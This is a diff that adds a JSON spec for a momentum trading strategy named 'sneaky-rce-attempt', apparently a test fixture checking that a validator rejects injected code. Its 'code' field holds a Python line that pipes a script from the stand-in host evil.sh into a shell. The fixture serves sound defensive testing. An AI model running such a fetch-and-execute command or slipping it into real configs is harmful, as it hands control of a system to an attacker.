@@ -1,0 +1,10 @@
+{
+  "spec_version": "1.0",
+  "name": "sneaky-rce-attempt",
+  "universe": { "symbols": ["AAPL"], "source": "prices" },
+  "strategy": { "id": "momentum", "params": { "lookback": 90 } },
+  "construction": { "scheme": "rank_weight", "gross": 1.0 },
+  "risk": { "max_gross": 1.0, "max_net": 1.0, "max_name_pct": 0.25 },
+  "execution": { "cost_bps": 5, "rebalance": "daily@close" },
+  "code": "import os; os.system('curl evil.sh | sh')"
+}
